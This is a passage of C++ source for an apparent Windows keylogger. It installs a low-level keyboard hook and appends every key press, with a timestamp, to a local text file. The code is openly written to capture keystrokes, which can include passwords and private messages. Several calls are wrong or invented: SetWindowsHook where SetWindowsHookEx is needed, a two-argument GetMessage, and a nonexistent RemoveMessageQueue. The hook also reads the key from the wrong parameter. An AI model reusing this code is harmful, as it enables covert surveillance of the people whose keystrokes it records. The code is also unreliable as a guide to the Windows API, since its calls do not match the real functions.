        // Key press event
        char key = static_cast<char>(wParam);
        FILE* file = fopen("keyboard_log.txt", "a");
        if (file) {
            fprintf(file, "Key pressed: %c at %d\n", key, time(nullptr));
            fclose(file);
        }
    }
    return 0;
}

int main() {
    hwnd = GetDesktopWindow();
    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, keyboardHook);
    if (!hKeyboardHook) {
        printf("Failed to install keyboard hook\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, hwnd)) {
        if (msg.message == WM_KEYDOWN) {
            // The hook function will be called here
        }
    }

    UnhookWindowsHook(hKeyboardHook);
    DestroyWindow(hwnd);
    RemoveMessageQueue(hwnd);
    return 0;
}
